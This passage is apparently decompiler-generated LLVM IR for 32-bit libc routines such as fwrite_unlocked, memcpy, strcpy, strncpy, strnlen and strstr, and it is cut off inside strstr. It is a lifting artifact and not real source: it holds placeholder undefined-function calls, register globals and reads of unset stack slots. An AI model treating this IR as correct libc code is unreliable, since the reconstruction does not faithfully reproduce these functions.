define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805224c = load i32, i32* @esi, align 4
  %v0_805224d = load i32, i32* @ebx, align 4
  store i32 %v0_805224d, i32* %stack_var_-8, align 4
  %v4_8052251 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052251, i32* @ebx, align 4
  %v3_8052256 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8052256, i32* @esi, align 4
  %v0_8052267 = load i32, i32* @ebx, align 4
  %v6_8052268 = call i32 @__GI_fwrite_unlocked(i32 %v0_8052267, i64 1, i32 %v3_8052256, i32 %arg2)
  %v1_8052273 = load i32, i32* @esi, align 4
  %v12_8052273 = icmp eq i32 %v6_8052268, %v1_8052273
  %v1_8052275 = icmp eq i1 %v12_8052273, false
  br i1 %v1_8052275, label %dec_label_pc_8052279, label %dec_label_pc_8052277

dec_label_pc_8052277:                             ; preds = %entry
  br label %dec_label_pc_8052279

dec_label_pc_8052279:                             ; preds = %entry, %dec_label_pc_8052277
  %v0_8052279 = phi i32 [ -1, %entry ], [ %v6_8052268, %dec_label_pc_8052277 ]
  %v2_805227c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805227c, i32* @ebx, align 4
  store i32 %v0_805224c, i32* @esi, align 4
  ret i32 %v0_8052279

; uselistorder directives
  uselistorder i32 %v6_8052268, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052279, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8052280 = load i32, i32* @edi, align 4
  %v0_8052281 = load i32, i32* @esi, align 4
  %v0_8052282 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8052287 = trunc i64 %arg2 to i32
  store i32 %v4_8052287, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805228f = inttoptr i32 %arg4 to i16*
  %v2_805228f = load i16, i16* %v1_805228f, align 2
  %v1_8052292 = and i16 %v2_805228f, 192
  %v6_8052297 = icmp eq i16 %v1_8052292, 192
  br i1 %v6_8052297, label %dec_label_pc_80522b2, label %dec_label_pc_805229e

dec_label_pc_805229e:                             ; preds = %entry
  %v0_805229e = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_80522a6 = call i32 @__stdio_trans2w_o(i16* %v1_805228f, i32 128, i32 %v0_805229e, i32 %v0_805229e, i32 %v0_8052282, i32 %v0_8052281, i32 %v0_8052280)
  %v1_80522ae = icmp eq i32 %v9_80522a6, 0
  %v1_80522b0 = icmp eq i1 %v1_80522ae, false
  br i1 %v1_80522b0, label %dec_label_pc_80522ee, label %dec_label_pc_80522b2

dec_label_pc_80522b2:                             ; preds = %dec_label_pc_805229e, %entry
  %v2_80522b2 = icmp eq i32 %v4_8052287, 0
  br i1 %v2_80522b2, label %dec_label_pc_80522ee, label %dec_label_pc_80522b6

dec_label_pc_80522b6:                             ; preds = %dec_label_pc_80522b2
  %v1_80522b6 = icmp eq i32 %arg3, 0
  br i1 %v1_80522b6, label %dec_label_pc_80522ee, label %dec_label_pc_80522ba

dec_label_pc_80522ba:                             ; preds = %dec_label_pc_80522b6
  %v9_80522bf = udiv i64 4294967295, %arg2
  %v10_80522bf = trunc i64 %v9_80522bf to i32
  %v6_80522c3 = icmp ult i32 %v10_80522bf, %arg3
  br i1 %v6_80522c3, label %dec_label_pc_80522df, label %dec_label_pc_80522c5

dec_label_pc_80522c5:                             ; preds = %dec_label_pc_80522ba
  %sext = mul i64 %arg2, 4294967296
  %v2_80522c8 = sdiv i64 %sext, 4294967296
  %v3_80522c8 = sext i32 %arg3 to i64
  %v4_80522c8 = mul nsw i64 %v3_80522c8, %v2_80522c8
  %v5_80522c8 = trunc i64 %v4_80522c8 to i32
  %v0_80522cb = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_80522d1 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_80522c8, i32 %v0_80522cb, i32 %v10_80522bf)
  %v6_80522d1 = sext i32 %v5_80522d1 to i64
  %v10_80522d8 = udiv i64 %v6_80522d1, %arg2
  %v11_80522d8 = trunc i64 %v10_80522d8 to i32
  br label %dec_label_pc_80522f0

dec_label_pc_80522df:                             ; preds = %dec_label_pc_80522ba
  %v0_80522df = load i32, i32* @ebx, align 4
  %v1_80522df = inttoptr i32 %v0_80522df to i16*
  %v2_80522df = load i16, i16* %v1_80522df, align 2
  %v3_80522df = or i16 %v2_80522df, 8
  store i16 %v3_80522df, i16* %v1_80522df, align 2
  %v0_80522e3 = load i32, i32* %stack_var_-28, align 4
  %v1_80522e3 = call i32 @__errno_location(i32 %v0_80522e3)
  %v1_80522e8 = inttoptr i32 %v1_80522e3 to i32*
  store i32 22, i32* %v1_80522e8, align 4
  br label %dec_label_pc_80522ee

dec_label_pc_80522ee:                             ; preds = %dec_label_pc_80522b6, %dec_label_pc_80522b2, %dec_label_pc_805229e, %dec_label_pc_80522df
  br label %dec_label_pc_80522f0

dec_label_pc_80522f0:                             ; preds = %dec_label_pc_80522c5, %dec_label_pc_80522ee
  %v0_80522f3 = phi i32 [ %v11_80522d8, %dec_label_pc_80522c5 ], [ 0, %dec_label_pc_80522ee ]
  store i32 %v0_8052281, i32* @esi, align 4
  store i32 %v0_8052280, i32* @edi, align 4
  ret i32 %v0_80522f3

; uselistorder directives
  uselistorder i32 %v0_805229e, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80522f0, { 1, 0 }
  uselistorder label %dec_label_pc_80522ee, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80522f5 = load i32, i32* @esi, align 4
  store i32 %v0_80522f5, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80522f6 = sdiv i32 %sext, 16777216
  store i32 %v4_80522f6, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052300 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052300, i32* %edi.global-to-local, align 4
  %v2_8052304 = udiv i32 %v4_80522f6, 4
  %v3_8052307 = inttoptr i32 %arg2 to i8*
  %v4_8052307 = bitcast i16* %arg1 to i8*
  %v5_8052307 = call i8* @_memcpy(i8* %v4_8052307, i8* %v3_8052307, i32 %v2_8052304)
  %v6_8052307 = ptrtoint i8* %v5_8052307 to i32
  store i32 %v6_8052307, i32* @ecx, align 4
  %v0_8052309 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052309 = and i32 %v0_8052309, 2
  %v3_8052309 = icmp eq i32 %v2_8052309, 0
  br i1 %v3_8052309, label %dec_label_pc_805230f, label %dec_label_pc_805230d

dec_label_pc_805230d:                             ; preds = %entry
  %v0_805230d = load i32, i32* %esi.global-to-local, align 4
  %v1_805230d = inttoptr i32 %v0_805230d to i16*
  %v2_805230d = load i16, i16* %v1_805230d, align 2
  %v3_805230d = load i32, i32* %edi.global-to-local, align 4
  %v4_805230d = inttoptr i32 %v3_805230d to i16*
  store i16 %v2_805230d, i16* %v4_805230d, align 2
  %v5_805230d = load i32, i32* %edi.global-to-local, align 4
  %v6_805230d = load i32, i32* %esi.global-to-local, align 4
  %v7_805230d = load i1, i1* @df, align 1
  %v8_805230d = select i1 %v7_805230d, i32 -2, i32 2
  %v9_805230d = add i32 %v8_805230d, %v5_805230d
  %v10_805230d = add i32 %v8_805230d, %v6_805230d
  store i32 %v9_805230d, i32* %edi.global-to-local, align 4
  store i32 %v10_805230d, i32* %esi.global-to-local, align 4
  %v0_805230f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805230f

dec_label_pc_805230f:                             ; preds = %entry, %dec_label_pc_805230d
  %v0_805230f = phi i32 [ %v0_8052309, %entry ], [ %v0_805230f.pre, %dec_label_pc_805230d ]
  %v2_805230f = urem i32 %v0_805230f, 2
  %v3_805230f = icmp eq i32 %v2_805230f, 0
  br i1 %v3_805230f, label %dec_label_pc_8052314, label %dec_label_pc_8052313

dec_label_pc_8052313:                             ; preds = %dec_label_pc_805230f
  %v0_8052313 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052313 = inttoptr i32 %v0_8052313 to i8*
  %v2_8052313 = load i8, i8* %v1_8052313, align 1
  %v3_8052313 = load i32, i32* %edi.global-to-local, align 4
  %v4_8052313 = inttoptr i32 %v3_8052313 to i8*
  store i8 %v2_8052313, i8* %v4_8052313, align 1
  %v5_8052313 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052313 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052313 = load i1, i1* @df, align 1
  %v8_8052313 = select i1 %v7_8052313, i32 -1, i32 1
  %v9_8052313 = add i32 %v8_8052313, %v5_8052313
  %v10_8052313 = add i32 %v8_8052313, %v6_8052313
  store i32 %v9_8052313, i32* %edi.global-to-local, align 4
  store i32 %v10_8052313, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052314

dec_label_pc_8052314:                             ; preds = %dec_label_pc_805230f, %dec_label_pc_8052313
  store i32 %v4_8052300, i32* %eax.global-to-local, align 4
  %v2_8052318 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052318, i32* @esi, align 4
  ret i32 %v4_8052300

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052314, { 1, 0 }
  uselistorder label %dec_label_pc_805230f, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805231c = load i32, i32* @edi, align 4
  %v4_8052325 = ptrtoint i8* %arg1 to i32
  %v5_8052329 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8052329 = ptrtoint i8* %v5_8052329 to i32
  store i32 %v6_8052329, i32* @ecx, align 4
  store i32 %v0_805231c, i32* @edi, align 4
  ret i32 %v4_8052325

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052335 = load i32, i32* @esi, align 4
  store i32 %v0_8052335, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_805233f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805233f, i32* %edi.global-to-local, align 4
  %v3_8052343 = call i32 @_strlen(i8* %arg1)
  %v2_8052345 = add i32 %v4_805233f, -1
  store i32 %v2_8052345, i32* %edi.global-to-local, align 4
  %v8_8052346.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8052346

dec_label_pc_8052346:                             ; preds = %dec_label_pc_8052346, %entry
  %v2_8052347 = phi i32 [ %v7_8052347, %dec_label_pc_8052346 ], [ %v2_8052345, %entry ]
  %v8_8052346 = phi i1 [ %v5_8052347, %dec_label_pc_8052346 ], [ %v8_8052346.pre, %entry ]
  %v4_8052346 = phi i32 [ %v0_8052348, %dec_label_pc_8052346 ], [ 0, %entry ]
  %v0_8052346 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052346 = inttoptr i32 %v0_8052346 to i8*
  %v2_8052346 = load i8, i8* %v1_8052346, align 1
  %v3_8052346 = zext i8 %v2_8052346 to i32
  %v5_8052346 = and i32 %v4_8052346, -256
  %v6_8052346 = or i32 %v3_8052346, %v5_8052346
  store i32 %v6_8052346, i32* %eax.global-to-local, align 4
  %v9_8052346 = select i1 %v8_8052346, i32 -1, i32 1
  %v10_8052346 = add i32 %v0_8052346, %v9_8052346
  store i32 %v10_8052346, i32* %esi.global-to-local, align 4
  %v3_8052347 = inttoptr i32 %v2_8052347 to i8*
  store i8 %v2_8052346, i8* %v3_8052347, align 1
  %v4_8052347 = load i32, i32* %edi.global-to-local, align 4
  %v5_8052347 = load i1, i1* @df, align 1
  %v6_8052347 = select i1 %v5_8052347, i32 -1, i32 1
  %v7_8052347 = add i32 %v6_8052347, %v4_8052347
  store i32 %v7_8052347, i32* %edi.global-to-local, align 4
  %v0_8052348 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052348 = trunc i32 %v0_8052348 to i8
  %v4_8052348 = icmp eq i8 %v3_8052348, 0
  %v1_805234a = icmp eq i1 %v4_8052348, false
  br i1 %v1_805234a, label %dec_label_pc_8052346, label %dec_label_pc_805234c

dec_label_pc_805234c:                             ; preds = %dec_label_pc_8052346
  store i32 %v4_805233f, i32* %eax.global-to-local, align 4
  %v2_8052350 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052350, i32* @esi, align 4
  ret i32 %v4_805233f

; uselistorder directives
  uselistorder i32 %v0_8052348, { 1, 0 }
  uselistorder i32 %v7_8052347, { 1, 0 }
  uselistorder i1 %v5_8052347, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052355 = ptrtoint i8* %arg1 to i32
  %v2_805235d = mul i32 %arg2, 256
  %v3_805235d = and i32 %v2_805235d, 65280
  %v4_805235d = and i32 %arg2, -65281
  %v5_805235d = or i32 %v3_805235d, %v4_805235d
  %v8_805235f.pre = load i1, i1* @df, align 1
  %v9_805235f = select i1 %v8_805235f.pre, i32 -1, i32 1
  br label %dec_label_pc_805235f

dec_label_pc_805235f:                             ; preds = %dec_label_pc_8052364, %entry
  %v4_805235f = phi i32 [ %v6_805235f, %dec_label_pc_8052364 ], [ %v5_805235d, %entry ]
  %v7_805235f = phi i32 [ %v10_805235f, %dec_label_pc_8052364 ], [ %v4_8052355, %entry ]
  %v1_805235f = inttoptr i32 %v7_805235f to i8*
  %v2_805235f = load i8, i8* %v1_805235f, align 1
  %v10_805235f = add i32 %v7_805235f, %v9_805235f
  %v3_8052360 = udiv i32 %v4_805235f, 256
  %v4_8052360 = trunc i32 %v3_8052360 to i8
  %v16_8052360 = icmp eq i8 %v2_805235f, %v4_8052360
  br i1 %v16_8052360, label %dec_label_pc_805236d.loopexit, label %dec_label_pc_8052364

dec_label_pc_8052364:                             ; preds = %dec_label_pc_805235f
  %v3_805235f = zext i8 %v2_805235f to i32
  %v5_805235f = and i32 %v4_805235f, -256
  %v6_805235f = or i32 %v3_805235f, %v5_805235f
  %v4_8052364 = icmp eq i8 %v2_805235f, 0
  %v1_8052366 = icmp eq i1 %v4_8052364, false
  br i1 %v1_8052366, label %dec_label_pc_805235f, label %dec_label_pc_8052368

dec_label_pc_8052368:                             ; preds = %dec_label_pc_8052364
  br label %dec_label_pc_805236d

dec_label_pc_805236d.loopexit:                    ; preds = %dec_label_pc_805235f
  %phitmp = add i32 %v10_805235f, -1
  br label %dec_label_pc_805236d

dec_label_pc_805236d:                             ; preds = %dec_label_pc_805236d.loopexit, %dec_label_pc_8052368
  %v0_805236d = phi i32 [ 0, %dec_label_pc_8052368 ], [ %phitmp, %dec_label_pc_805236d.loopexit ]
  ret i32 %v0_805236d

; uselistorder directives
  uselistorder i8 %v2_805235f, { 1, 2, 0 }
  uselistorder i32 %v4_805235f, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052375 = load i32, i32* @esi, align 4
  store i32 %v0_8052375, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805237d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805237d, i32* %edi.global-to-local, align 4
  %v4_8052381.pre = load i32, i32* @eax, align 4
  %v8_8052381.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8052381

dec_label_pc_8052381:                             ; preds = %dec_label_pc_8052381.dec_label_pc_8052381_crit_edge, %entry
  %v2_8052382 = phi i32 [ %v7_8052382, %dec_label_pc_8052381.dec_label_pc_8052381_crit_edge ], [ %v4_805237d, %entry ]
  %v8_8052381 = phi i1 [ %v5_8052382, %dec_label_pc_8052381.dec_label_pc_8052381_crit_edge ], [ %v8_8052381.pre, %entry ]
  %v4_8052381 = phi i32 [ %v0_8052383, %dec_label_pc_8052381.dec_label_pc_8052381_crit_edge ], [ %v4_8052381.pre, %entry ]
  %v7_8052381 = phi i32 [ %v0_8052381.pre, %dec_label_pc_8052381.dec_label_pc_8052381_crit_edge ], [ %arg2, %entry ]
  %v1_8052381 = inttoptr i32 %v7_8052381 to i8*
  %v2_8052381 = load i8, i8* %v1_8052381, align 1
  %v3_8052381 = zext i8 %v2_8052381 to i32
  %v5_8052381 = and i32 %v4_8052381, -256
  %v6_8052381 = or i32 %v3_8052381, %v5_8052381
  store i32 %v6_8052381, i32* %eax.global-to-local, align 4
  %v9_8052381 = select i1 %v8_8052381, i32 -1, i32 1
  %v10_8052381 = add i32 %v7_8052381, %v9_8052381
  store i32 %v10_8052381, i32* %esi.global-to-local, align 4
  %v3_8052382 = inttoptr i32 %v2_8052382 to i8*
  store i8 %v2_8052381, i8* %v3_8052382, align 1
  %v4_8052382 = load i32, i32* %edi.global-to-local, align 4
  %v5_8052382 = load i1, i1* @df, align 1
  %v6_8052382 = select i1 %v5_8052382, i32 -1, i32 1
  %v7_8052382 = add i32 %v6_8052382, %v4_8052382
  store i32 %v7_8052382, i32* %edi.global-to-local, align 4
  %v0_8052383 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052383 = trunc i32 %v0_8052383 to i8
  %v4_8052383 = icmp eq i8 %v3_8052383, 0
  %v1_8052385 = icmp eq i1 %v4_8052383, false
  br i1 %v1_8052385, label %dec_label_pc_8052381.dec_label_pc_8052381_crit_edge, label %dec_label_pc_8052387

dec_label_pc_8052381.dec_label_pc_8052381_crit_edge: ; preds = %dec_label_pc_8052381
  %v0_8052381.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052381

dec_label_pc_8052387:                             ; preds = %dec_label_pc_8052381
  store i32 %v4_805237d, i32* %eax.global-to-local, align 4
  %v2_805238b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805238b, i32* @edx, align 4
  %v2_805238c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805238c, i32* @esi, align 4
  ret i32 %v4_805237d

; uselistorder directives
  uselistorder i32 %v0_8052383, { 1, 0 }
  uselistorder i32 %v7_8052382, { 1, 0 }
  uselistorder i1 %v5_8052382, { 1, 0 }
  uselistorder i32 %v4_805237d, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80523a5 = load i32, i32* @esi, align 4
  store i32 %v0_80523a5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80523b1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80523b1, i32* %edi.global-to-local, align 4
  %v1_80523b5 = add i32 %arg3, 1
  store i32 %v1_80523b5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80523b6

dec_label_pc_80523b6:                             ; preds = %dec_label_pc_80523b9, %entry
  %v3_80523ba = phi i32 [ %v4_80523b1, %entry ], [ %v8_80523ba, %dec_label_pc_80523b9 ]
  %v0_80523b6 = phi i32 [ %v1_80523b5, %entry ], [ %v0_80523b6.pre, %dec_label_pc_80523b9 ]
  %v1_80523b6 = add i32 %v0_80523b6, -1
  %v8_80523b6 = icmp eq i32 %v1_80523b6, 0
  store i32 %v1_80523b6, i32* %ecx.global-to-local, align 4
  br i1 %v8_80523b6, label %.loopexit, label %dec_label_pc_80523b9

dec_label_pc_80523b9:                             ; preds = %dec_label_pc_80523b6
  %v0_80523b9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80523b9 = inttoptr i32 %v0_80523b9 to i8*
  %v2_80523b9 = load i8, i8* %v1_80523b9, align 1
  %v10_80523b9 = load i1, i1* @df, align 1
  %v11_80523b9 = select i1 %v10_80523b9, i32 -1, i32 1
  %v12_80523b9 = add i32 %v11_80523b9, %v0_80523b9
  store i32 %v12_80523b9, i32* %esi.global-to-local, align 4
  %v4_80523ba = inttoptr i32 %v3_80523ba to i8*
  store i8 %v2_80523b9, i8* %v4_80523ba, align 1
  %v5_80523ba = load i32, i32* %edi.global-to-local, align 4
  %v6_80523ba = load i1, i1* @df, align 1
  %v7_80523ba = select i1 %v6_80523ba, i32 -1, i32 1
  %v8_80523ba = add i32 %v7_80523ba, %v5_80523ba
  store i32 %v8_80523ba, i32* %edi.global-to-local, align 4
  %v6_80523bb = icmp eq i8 %v2_80523b9, 0
  %v1_80523bd = icmp eq i1 %v6_80523bb, false
  %v0_80523b6.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_80523bd, label %dec_label_pc_80523b6, label %dec_label_pc_80523bf

dec_label_pc_80523bf:                             ; preds = %dec_label_pc_80523b9
  %v1_80523bf = add i32 %v0_80523b6.pre, -1
  store i32 %v1_80523bf, i32* %ecx.global-to-local, align 4
  %v2_80523c0 = sext i8 %v2_80523b9 to i32
  %v4_80523c0 = inttoptr i32 %v8_80523ba to i8*
  %v5_80523c0 = call i8* @_memset(i8* %v4_80523c0, i32 %v2_80523c0, i32 %v1_80523bf)
  %v6_80523c0 = ptrtoint i8* %v5_80523c0 to i32
  store i32 %v6_80523c0, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_80523b6, %dec_label_pc_80523bf
  %v2_80523c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80523c6, i32* @edx, align 4
  %v2_80523c7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80523c7, i32* @esi, align 4
  ret i32 %v4_80523b1

; uselistorder directives
  uselistorder i32 %v8_80523ba, { 0, 2, 1 }
  uselistorder i8 %v2_80523b9, { 0, 2, 1 }
  uselistorder i32 %v1_80523b6, { 1, 0 }
  uselistorder i32 %v4_80523b1, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_80523cc = ptrtoint i8* %tmp4 to i32
  %v8_80523df5 = icmp eq i32 %tmp, 0
  %v1_80523e06 = icmp eq i1 %v8_80523df5, false
  br i1 %v1_80523e06, label %dec_label_pc_80523d9, label %dec_label_pc_80523e2

dec_label_pc_80523d9:                             ; preds = %entry, %dec_label_pc_80523de
  %v1_80523df8 = phi i32 [ %v1_80523df, %dec_label_pc_80523de ], [ %tmp, %entry ]
  %v0_80523e27 = phi i32 [ %v1_80523de, %dec_label_pc_80523de ], [ %v4_80523cc, %entry ]
  %v1_80523d9 = inttoptr i32 %v0_80523e27 to i8*
  %v2_80523d9 = load i8, i8* %v1_80523d9, align 1
  %v3_80523d9 = icmp eq i8 %v2_80523d9, 0
  br i1 %v3_80523d9, label %dec_label_pc_80523e2, label %dec_label_pc_80523de

dec_label_pc_80523de:                             ; preds = %dec_label_pc_80523d9
  %v1_80523de = add i32 %v0_80523e27, 1
  %v1_80523df = add i32 %v1_80523df8, -1
  %v8_80523df = icmp eq i32 %v1_80523df, 0
  %v1_80523e0 = icmp eq i1 %v8_80523df, false
  br i1 %v1_80523e0, label %dec_label_pc_80523d9, label %dec_label_pc_80523e2

dec_label_pc_80523e2:                             ; preds = %dec_label_pc_80523de, %dec_label_pc_80523d9, %entry
  %v0_80523e2.lcssa = phi i32 [ %v4_80523cc, %entry ], [ %v0_80523e27, %dec_label_pc_80523d9 ], [ %v1_80523de, %dec_label_pc_80523de ]
  %v2_80523e2 = sub i32 %v0_80523e2.lcssa, %v4_80523cc
  ret i32 %v2_80523e2

; uselistorder directives
  uselistorder i32 %v1_80523df, { 1, 0 }
  uselistorder i32 %v0_80523e27, { 0, 2, 1 }
  uselistorder i32 %v4_80523cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523d9, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_80523eb = load i32, i32* @ebx, align 4
  %v4_80523ef = ptrtoint i8* %arg2 to i32
  %v2_80523f7 = load i8, i8* %arg2, align 1
  %v1_80523fa = icmp eq i8 %v2_80523f7, 0
  br i1 %v1_80523fa, label %dec_label_pc_80524a7, label %dec_label_pc_8052402

dec_label_pc_8052402:                             ; preds = %entry
  %v1_8052402 = add i32 %arg1, -1
  br label %dec_label_pc_8052403

dec_label_pc_8052403:                             ; preds = %dec_label_pc_805240f, %dec_label_pc_8052402
  %v0_8052403 = phi i32 [ %v1_8052403, %dec_label_pc_805240f ], [ %v1_8052402, %dec_label_pc_8052402 ]
  %v1_8052403 = add i32 %v0_8052403, 1
  %v1_8052404 = inttoptr i32 %v1_8052403 to i8*
  %v2_8052404 = load i8, i8* %v1_8052404, align 1
  %v1_8052407 = icmp eq i8 %v2_8052404, 0
  br i1 %v1_8052407, label %dec_label_pc_80524a5, label %dec_label_pc_805240f

dec_label_pc_805240f:                             ; preds = %dec_label_pc_8052403
  %v12_805240f = icmp eq i8 %v2_8052404, %v2_80523f7
  %v1_8052411 = icmp eq i1 %v12_805240f, false
  br i1 %v1_8052411, label %dec_label_pc_8052403, label %dec_label_pc_8052413

dec_label_pc_8052413:                             ; preds = %dec_label_pc_805240f
  %v1_8052413 = add i32 %v4_80523ef, 1
  %v2_805241a = inttoptr i32 %v1_8052413 to i8*
  %v3_805241a = load i8, i8* %v2_805241a, align 1
  %v1_8052421 = icmp eq i8 %v3_805241a, 0
  br i1 %v1_8052421, label %dec_label_pc_80524a7, label %dec_label_pc_8052425

dec_label_pc_8052425:                             ; preds = %dec_label_pc_8052413
  %v1_8052425 = add i32 %v0_8052403, 2
  %v1_8052466 = add i32 %v4_80523ef, 2
  %v2_8052466 = inttoptr i32 %v1_8052466 to i8*
  br label %dec_label_pc_8052458

dec_label_pc_8052430:                             ; preds = %dec_label_pc_805249d
  %v2_8052430 = inttoptr i32 %v0_805246b to i8*
  %v3_8052430 = load i8, i8* %v2_8052430, align 1
  br label %dec_label_pc_805244d.preheader

dec_label_pc_805244d.preheader:                   ; preds = %dec_label_pc_8052430, %dec_label_pc_8052458
  %v0_8052439.ph.in = phi i8 [ %v0_805244d27.in, %dec_label_pc_8052458 ], [ %v3_8052430, %dec_label_pc_8052430 ]
  %v12_805244d54 = icmp eq i8 %v0_8052439.ph.in, %v2_80523f7
  %v1_805244f55 = icmp eq i1 %v12_805244d54, false
  br i1 %v1_805244f55, label %dec_label_pc_8052439, label %dec_label_pc_8052451

dec_label_pc_8052439:                             ; preds = %dec_label_pc_805244d.preheader, %dec_label_pc_8052449
  %v0_805243957.in = phi i8 [ %v2_805244a, %dec_label_pc_8052449 ], [ %v0_8052439.ph.in, %dec_label_pc_805244d.preheader ]
  %v0_805243d56 = phi i32 [ %v1_8052449, %dec_label_pc_8052449 ], [ %v0_805246b, %dec_label_pc_805244d.preheader ]
  %v1_8052439 = icmp eq i8 %v0_805243957.in, 0
  br i1 %v1_8052439, label %dec_label_pc_80524a5, label %dec_label_pc_805243d

dec_label_pc_805243d:                             ; preds = %dec_label_pc_8052439
  %v1_805243d = add i32 %v0_805243d56, 1
  %v1_805243e = inttoptr i32 %v1_805243d to i8*
  %v2_805243e = load i8, i8* %v1_805243e, align 1
  %v12_8052441 = icmp eq i8 %v2_805243e, %v2_80523f7
  br i1 %v12_8052441, label %dec_label_pc_8052451, label %dec_label_pc_8052445

dec_label_pc_8052445:                             ; preds = %dec_label_pc_805243d
  %v1_8052445 = icmp eq i8 %v2_805243e, 0
  br i1 %v1_8052445, label %dec_label_pc_80524a5, label %dec_label_pc_8052449

dec_label_pc_8052449:                             ; preds = %dec_label_pc_8052445
  %v1_8052449 = add i32 %v0_805243d56, 2
  %v1_805244a = inttoptr i32 %v1_8052449 to i8*
  %v2_805244a = load i8, i8* %v1_805244a, align 1
  %v12_805244d = icmp eq i8 %v2_805244a, %v2_80523f7
  %v1_805244f = icmp eq i1 %v12_805244d, false
  br i1 %v1_805244f, label %dec_label_pc_8052439, label %dec_label_pc_8052451

dec_label_pc_8052451:                             ; preds = %dec_label_pc_8052449, %dec_label_pc_805243d, %dec_label_pc_805244d.preheader
